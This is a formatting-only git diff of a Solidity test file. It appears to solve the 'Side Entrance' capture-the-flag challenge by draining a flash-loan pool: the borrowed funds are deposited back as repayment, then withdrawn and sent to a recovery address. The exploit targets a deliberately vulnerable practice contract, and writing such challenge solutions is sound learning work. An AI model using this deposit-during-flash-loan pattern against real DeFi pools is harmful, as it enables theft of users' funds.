@@ -61,28 +61,29 @@ contract SideEntranceChallenge is Test {
     }
 }
 
-contract Attack is Test{
+contract Attack is Test {
     SideEntranceLenderPool pool;
     address recovery = makeAddr("recovery");
 
-	constructor(SideEntranceLenderPool _pool) {
+    constructor(
+        SideEntranceLenderPool _pool
+    ) {
         pool = _pool;
     }
 
-	function execute() public payable {
-		pool.deposit{value: 1000e18}();
-	}
-	
+    function execute() public payable {
+        pool.deposit{value: 1000e18}();
+    }
+
     function withDrawFromPoolandSendtoRecovery() public payable {
         pool.withdraw();
-        (bool success, ) = address(recovery).call{value:1000e18}("");
+        (bool success,) = address(recovery).call{value: 1000e18}("");
         require(success, "transfer failed");
     }
 
-	function attack() public {
-		pool.flashLoan(1000e18);
-	}
+    function attack() public {
+        pool.flashLoan(1000e18);
+    }
 
-    receive() external payable{}	
+    receive() external payable {}
 }
-
